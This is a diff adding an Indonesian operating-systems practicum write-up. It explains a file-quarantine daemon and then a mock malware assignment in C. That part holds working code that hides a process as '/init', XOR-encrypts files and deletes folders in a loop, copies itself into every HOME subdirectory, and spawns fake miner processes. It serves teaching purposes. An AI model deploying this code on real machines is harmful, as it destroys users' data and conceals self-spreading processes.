@@ -217,6 +217,473 @@ void decodeFile() {
 E. Kemudian masuk ke link website untuk mengecek password dari hasil decode tersebut.
 ![image](https://github.com/user-attachments/assets/cfe1fd95-2458-4eb3-9d3f-17cfdaaf3be5)
 
+## Soal_2
+- Fungsi:
+  + dekripsi
+  + quarantine
+  + return
+  + erase
+  + shutdown
+melakukan download file, unzip file dan menjalankan daemon untuk dekripsi dengan menggunakan flag --decrypt
+```c
+void download_and_extract() {
+    ensure_directory_exists(STARTER_KIT);
+
+    char zip_path[300];
+    strcpy(zip_path, STARTER_KIT);
+    strcat(zip_path, "/starter_kit.zip");
+    const char *download_url = "https://drive.usercontent.google.com/u/0/uc?id=1_5GxIGfQr3mNKuavJbte_AoRkEQLXSKS&export=download";
+    char *wget_args[] = { "wget", "-O", zip_path, (char *)download_url, NULL };
+    pid_t pid = fork();
+    if(pid == 0) {
+        execvp("wget", wget_args);
+        perror("execvp failed untuk wget");
+        exit(EXIT_FAILURE);
+    } else if (pid > 0) {
+        int status;
+        waitpid(pid, &status, 0);
+        if (WIFEXITED(status) && WEXITSTATUS(status) != 0) {
+            fprintf(stderr, "Error saat mendownload starter_kit.zip\n");
+            return;
+        }
+    } else {
+        perror("Fork gagal untuk wget");
+        return;
+    }
+
+    char *unzip_args[] = { "unzip", "-o", zip_path, "-d", STARTER_KIT, NULL };
+    pid = fork();
+    if(pid == 0) {
+        execvp("unzip", unzip_args);
+        perror("execvp failed untuk unzip");
+        exit(EXIT_FAILURE);
+    } else if (pid > 0) {
+        int status;
+        waitpid(pid, &status, 0);
+        if (WIFEXITED(status) && WEXITSTATUS(status) != 0) {
+            fprintf(stderr, "Error saat mengekstrak starter_kit.zip\n");
+            return;
+        }
+    } else {
+        perror("Fork gagal untuk unzip");
+        return;
+    }
+
+    if (remove(zip_path) != 0) {
+        perror("Gagal menghapus file starter_kit.zip");
+    }
+}
+```
+- mengecek apakah folder starter_kit untuk meletakkan file download ada atau tidak, jika tidak ada maka dibuat terlebih dahulu
+- menggunakan `execvp("wget", wget_args);` untuk mendownload file dan `execvp("unzip", unzip_args);` untuk unzip file
+  + di child fork pertama dijalankan wget, lalu parentnya menunggu sampai proses selesai baru dilakukan fork kedua yang child nya meng-unzip file 
+
+```c
+void run_daemon() {
+    pid_t pid = fork();
+    if (pid < 0) {
+        perror("Fork gagal");
+        exit(EXIT_FAILURE);
+    }
+    if (pid > 0) {
+        exit(EXIT_SUCCESS);
+    }
+
+    umask(0);
+    if (setsid() < 0) exit(EXIT_FAILURE);
+    if (chdir("/") < 0) exit(EXIT_FAILURE);
+    close(STDIN_FILENO);
+    close(STDOUT_FILENO);
+    close(STDERR_FILENO);
+
+    FILE *fp = fopen(PID_FILE, "w");
+    if (fp) {
+        char pid_str[30];
+        sprintf(pid_str, "%d", getpid());
+        fputs(pid_str, fp);
+        fclose(fp);
+    }
+    
+    char timestamp[50];
+    get_timestamp(timestamp, sizeof(timestamp));
+    char log_msg[300];
+    strcpy(log_msg, "Decrypt:\n");
+    strcat(log_msg, timestamp);
+    strcat(log_msg, " - Successfully started decryption process with PID ");
+    {
+        char temp[30];
+        sprintf(temp, "%d", getpid());
+        strcat(log_msg, temp);
+    }
+    strcat(log_msg, ".");
+    write_log(log_msg);
+
+    while (1) {
+        decrypt_files();
+        sleep(1);
+    }
+}
+```
+- ini menjalankan daemon untuk fungsi decrypt_files();
+```c
+void decrypt_files() {
+    DIR *dir = opendir(QUARANTINE_DIR);
+    if (!dir) {
+        perror("Gagal membuka direktori karantina");
+        printf("\nProses untuk membuat direktori karantina");
+        ensure_directory_exists(QUARANTINE_DIR);
+        printf("\nProses membuat direktori karantina selesai");
+        return;
+    }
+    struct dirent *entry;
+    char oldname[256], newname[256];
+    while ((entry = readdir(dir))) {
+        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
+            continue;
+
+        strcpy(oldname, QUARANTINE_DIR);
+        strcat(oldname, "/");
+        strcat(oldname, entry->d_name);
+
+        size_t output_length;
+        char *decoded = base64_decode(entry->d_name, strlen(entry->d_name), &output_length);
+        if (decoded) {
+            strcpy(newname, QUARANTINE_DIR);
+            strcat(newname, "/");
+            strcat(newname, decoded);
+            if (rename(oldname, newname) == 0) {
+                printf("Renamed: %s -> %s\n", entry->d_name, decoded);
+            } else {
+                perror("Gagal mengganti nama file");
+            }
+            free(decoded);
+        }
+    }
+    closedir(dir);
+}
+```
+- intinya ini mengambil nama file, lalu mendecryptntya dengan function base64_decode, lalu me-rename file sebelumnya, hanya saja, karna function ini dijalankan di daemon, maka proses rename nya ditambahkan quarantine/ di depannya agar location file nya di folder quarantine
+
+- Untuk quarantine dan return intinya adalah memindahkan file
+```c
+void move_files(const char *src, const char *dst, const char *op) {
+    ensure_directory_exists(src);
+    ensure_directory_exists(dst);
+    
+    DIR *dir = opendir(src);
+    if (!dir) {
+        perror("Gagal membuka direktori sumber");
+        return;
+    }
+    
+    char header[100];
+    strcpy(header, op);
+    strcat(header, ":");
+    write_log(header);
+    
+    struct dirent *entry;
+    char oldpath[256], newpath[256];
+    char log_msg[300];
+    char timestamp[50];
+    
+    while ((entry = readdir(dir))) {
+        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
+            continue;
+
+        strcpy(oldpath, src);
+        strcat(oldpath, "/");
+        strcat(oldpath, entry->d_name);
+
+        strcpy(newpath, dst);
+        strcat(newpath, "/");
+        strcat(newpath, entry->d_name);
+
+        if (rename(oldpath, newpath) == 0) {
+            printf("Moved: %s -> %s\n", entry->d_name, dst);
+            get_timestamp(timestamp, sizeof(timestamp));
+            if (strcmp(op, "Quarantine") == 0) {
+                strcpy(log_msg, timestamp);
+                strcat(log_msg, " - ");
+                strcat(log_msg, entry->d_name);
+                strcat(log_msg, " - Successfully moved to quarantine directory.");
+            } else if (strcmp(op, "Return") == 0) {
+                strcpy(log_msg, timestamp);
+                strcat(log_msg, " - ");
+                strcat(log_msg, entry->d_name);
+                strcat(log_msg, " - Successfully returned to starter kit directory.");
+            }
+            write_log(log_msg);
+        } else {
+            perror("Gagal memindahkan file");
+        }
+    }
+    closedir(dir);
+}
+```
+- di sini dicek path source dan path location, jika tidak ada maka dibuat folder nya
+- just in case gabisa dibuat, maka ga bisa dibuka, dan dioutput pesan gagal membuka direktori sumber
+- di sini konsepnya merename file, lebih tepatnya merename path file, bagian awalnya diubah (misal source/file.exe jadi target/file.exe)
+
+- untuk fungsi eradicate(), --eradicate, ini simpelnya menghapus semua file yang ada di folder quarantine
+- buka folder, mengeluarkan 1/1 file ke filepath, lalu remove filepath
+
+```c
+void shutdown_daemon() {
+    FILE *fp = fopen(PID_FILE, "r");
+    if (!fp) {
+        fprintf(stderr, "PID file tidak ditemukan. Apakah daemon sedang berjalan?\n");
+        return;
+    }
+    int pid;
+    fscanf(fp, "%d", &pid);
+    fclose(fp);
+    if (kill(pid, SIGTERM) == 0) {
+        printf("Daemon dengan PID %d dimatikan.\n", pid);
+        char timestamp[50];
+        get_timestamp(timestamp, sizeof(timestamp));
+        char log_msg[300];
+        strcpy(log_msg, "Shutdown:\n");
+        strcat(log_msg, timestamp);
+        strcat(log_msg, " - Successfully shut off decryption process with PID ");
+        {
+            char temp[30];
+            sprintf(temp, "%d", pid);
+            strcat(log_msg, temp);
+        }
+        strcat(log_msg, ".");
+        write_log(log_msg);
+        remove(PID_FILE);
+    } else {
+        perror("Gagal mematikan daemon");
+    }
+}
+```
+- untuk mematikan daemon, karna awalnya, ketika daemon dibuat, pid disimpan di file starterkit.pid, maka disini untuk mematikannya, `kill(pid, SIGTERM)`
+
+## Soal_3
+### A. Malware ini bekerja secara daemon dan menginfeksi perangkat korban dan menyembunyikan diri dengan mengganti namanya menjadi `/init`.
+
+```
+void daemonize() {
+    pid_t pid = fork();
+    if (pid > 0) exit(0);     // Parent process keluar
+    if (pid < 0) exit(1);     // Fork gagal
+
+    setsid();                 // Membuat session baru agar menjadi daemon
+    pid = fork();
+    if (pid > 0) exit(0);     // Exit dari session leader
+
+    chdir("/");               // Ganti direktori kerja ke root
+    fclose(stdin); 
+    fclose(stdout); 
+    fclose(stderr);           // Tutup file descriptor standar
+
+    prctl(PR_SET_NAME, "/init");  // Ganti nama proses menjadi /init
+}
+```
+- Forking 2 Kali: Membuat proses menjadi tidak memiliki controlling terminal dan benar-benar berjalan di background.
+- `setsid()`: Membuat proses menjadi session leader agar benar-benar terpisah dari terminal.
+- `prctl(PR_SET_NAME, "/init")`: Mengubah nama proses di sistem menjadi /init.
+
+### B. Mengimplementasikan fitur wannacryptor yang bertugas untuk melakukan enkripsi pada seluruh file dan folder yang terdapat di direktori target (./test), dengan menggunakan metode XOR berdasarkan timestamp saat program dijalankan.
+Untuk kelompok genap, enkripsi folder dilakukan dengan mengubah folder dan isinya menjadi file `.zip`, kemudian file `.zip` tersebut dienkripsi menggunakan XOR dan folder asli akan dihapus.
+
+```
+void xor_encrypt(const char *path) {
+    FILE *f = fopen(path, "rb+");
+    if (!f) return;
+    fseek(f, 0, SEEK_END);
+    long size = ftell(f);
+    rewind(f);
+
+    char *buffer = malloc(size);
+    if (!buffer) {
+        fclose(f);
+        return;
+    }
+    fread(buffer, 1, size, f);
+    rewind(f);
+    for (long i = 0; i < size; i++)
+        buffer[i] ^= timestamp_key[i % strlen(timestamp_key)];
+    fwrite(buffer, 1, size, f);
+
+    free(buffer);
+    fclose(f);
+}
+```
+menggunakan metode XOR sederhana untuk mengenkripsi file. Kunci enkripsi didasarkan pada timestamp saat program dijalankan, sehingga hasil enkripsinya berbeda setiap kali program dijalankan.
+
+```
+void zip_and_encrypt(const char *folder_path) {
+    char zip_cmd[8192];
+    snprintf(zip_cmd, sizeof(zip_cmd), "zip -r -q '%s.zip' '%s' && rm -rf '%s'", folder_path, folder_path, folder_path);
+    system(zip_cmd);  // Jalankan perintah zip dan hapus folder
+
+    char zip_file[4096];
+    snprintf(zip_file, sizeof(zip_file), "%s.zip", folder_path);
+    xor_encrypt(zip_file);  // Enkripsi file zip
+}
+```
+Folder dikompresi menjadi `.zip`, lalu hasil file `.zip` akan dienkripsi. Folder aslinya kemudian dihapus secara permanen.
+
+```
+void wannacryptor(const char *target) {
+    DIR *dir = opendir(target);
+    if (!dir) return;
+
+    struct dirent *entry;
+    while ((entry = readdir(dir)) != NULL) {
+        if (!strcmp(entry->d_name, ".") || !strcmp(entry->d_name, "..")) continue;
+
+        char path[4096];
+        snprintf(path, sizeof(path), "%s/%s", target, entry->d_name);
+
+        struct stat st;
+        if (stat(path, &st) == -1) continue;
+
+        if (S_ISDIR(st.st_mode)) {
+            zip_and_encrypt(path);  // Kelompok GENAP
+        } else if (S_ISREG(st.st_mode)) {
+            xor_encrypt(path);  // Enkripsi file langsung
+        }
+    }
+    closedir(dir);
+}
+```
+Program memindai semua isi direktori target (./test). Bila menemukan folder, dilakukan zip + enkripsi. Bila menemukan file biasa, langsung dienkripsi.
+
+```
+void *loop_crypto(void *arg) {
+    while (1) {
+        wannacryptor(FOLDER_TARGET);
+        sleep(30);
+    }
+}
+```
+Fungsi wannacryptor dipanggil setiap 30 detik dalam thread `loop_crypto`, sehingga proses enkripsi berjalan terus-menerus di background.
+
+### C. Fitur trojan.wrm bertugas menyebarkan malware dengan cara menduplikasi file binary malware (runme) ke seluruh direktori yang ada di dalam folder HOME milik user.
+
+```
+void replicate_malware() {
+    char *home = getenv("HOME");
+    if (!home) return;
+    DIR *dir = opendir(home);
+    if (!dir) return;
+
+    struct dirent *entry;
+    while ((entry = readdir(dir)) != NULL) {
+        if (entry->d_type != DT_DIR) continue;
+        if (!strcmp(entry->d_name, ".") || !strcmp(entry->d_name, "..")) continue;
+
+        char folder_path[2048];
+        snprintf(folder_path, sizeof(folder_path), "%s/%s", home, entry->d_name);
+
+        DIR *sub = opendir(folder_path);
+        if (!sub) continue;
+        closedir(sub);
+
+        char dest[4096];
+        snprintf(dest, sizeof(dest), "%s/runme", folder_path);
+
+        FILE *src = fopen("./runme", "rb");
+        FILE *dst = fopen(dest, "wb");
+        if (src && dst) {
+            char buf[1024];
+            size_t n;
+            while ((n = fread(buf, 1, sizeof(buf), src)) > 0)
+                fwrite(buf, 1, n, dst);
+        }
+        if (src) fclose(src);
+        if (dst) fclose(dst);
+    }
+    closedir(dir);
+}
+```
+Fungsi `replicate_malware` akan:
+- Mengambil path dari environment variable HOME
+- Membuka semua subdirektori di dalam folder HOME
+- Untuk setiap subdirektori, membuat salinan file ./runme (yaitu binary malware ini sendiri) ke dalam subfolder tersebut
+
+```
+void *loop_replicate(void *arg) {
+    while (1) {
+        replicate_malware();
+        sleep(30);
+    }
+}
+```
+Agar malware terus menyebar, proses ini dijalankan dalam thread yang mengulang setiap 30 detik.
+
+```
+void start_trojan() {
+    prctl(PR_SET_NAME, "trojan.wrm");  // Nama proses
+    pthread_t t;
+    pthread_create(&t, NULL, loop_replicate, NULL);
+    pthread_join(t, NULL);
+}
+```
+Thread `loop_replicate` akan dijalankan oleh proses anak yang dinamai `trojan.wrm`.
+
+Output:
+
+
+![runme](assets/trojan.png)
+
+### D. Fitur ketiga bernama rodok.exe dirancang untuk menjalankan fork bomb, yaitu proses yang akan membuat banyak proses anak secara terus-menerus. Namun berbeda dari fork bomb biasa, setiap proses yang dibuat oleh rodok.exe berperan sebagai cryptominer palsu yang secara berkala menulis hash acak ke dalam log file.
+
+```
+void start_rodok() {
+    prctl(PR_SET_NAME, "rodok.exe");
+    for (int i = 0; i < MAX_MINER; i++) {
+        pid_t pid = fork();
+        if (pid == 0) {
+            pthread_t t;
+            int *id = malloc(sizeof(int));
+            *id = i;
+            pthread_create(&t, NULL, mine_crafter, id);
+            pthread_join(t, NULL);
+            exit(0);
+        }
+    }
+    while (1) pause();
+}
+```
+Proses rodok.exe akan membuat 4 child process (jumlah ditentukan dengan MAX_MINER). Masing-masing proses akan menjalankan thread `mine_crafter`.
+
+```
+void *mine_crafter(void *arg) {
+    int id = *(int *)arg;
+    char name[32];
+    snprintf(name, sizeof(name), "mine-crafter-%d", id);
+    prctl(PR_SET_NAME, name);
+
+    char logpath[] = "/tmp/.miner.log";
+    while (1) {
+        char *hash = random_hash();
+        FILE *f = fopen(logpath, "a");
+        if (f) {
+            time_t now = time(NULL);
+            struct tm *t = localtime(&now);
+            fprintf(f, "[%04d-%02d-%02d %02d:%02d:%02d][Miner %02d] %s\n",
+                t->tm_year + 1900, t->tm_mon + 1, t->tm_mday,
+                t->tm_hour, t->tm_min, t->tm_sec,
+                id, hash);
+            fclose(f);
+        }
+        sleep(rand() % 28 + 3);  // delay acak agar realistis
+    }
+    return NULL;
+}
+```
+- Setiap proses `mine-crafter-<id>` akan menghasilkan hash acak sepanjang 64 karakter hex.
+- Hasil hash akan disimpan di file log tersembunyi: `/tmp/.miner.log`.
+- Setiap hash dicatat bersamaan dengan timestamp dan ID proses miner.
+
+Output:
+
+
+![miner.log](assets/miner.log.png)
     
 
 
